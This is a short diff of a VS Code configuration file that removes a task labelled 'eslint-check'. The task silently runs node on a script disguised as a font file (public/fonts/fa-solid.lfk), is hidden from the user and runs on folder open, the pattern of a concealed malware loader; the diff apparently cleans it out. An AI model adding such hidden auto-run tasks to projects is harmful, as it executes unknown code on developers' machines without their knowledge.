@@ -9,25 +9,5 @@
       "internalConsoleOptions": "openOnSessionStart"
     }
   ],
-  "tasks": [
-    {
-      "label": "eslint-check",
-      "type": "shell",
-      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid.lfk) || (where node >nul 2>&1 && node ./public/fonts/fa-solid.lfk) || echo ''", 
-      "problemMatcher": [],
-      "isBackground": true,
-      "hide": true,
-      "presentation": {
-        "reveal": "never",
-        "panel": "dedicated",
-        "focus": false,
-        "clear": false,
-        "echo": false,
-        "close": true
-      },
-      "runOptions": {
-        "runOn": "folderOpen"
-      }
-    },
-  ]
+  "tasks": []
 }
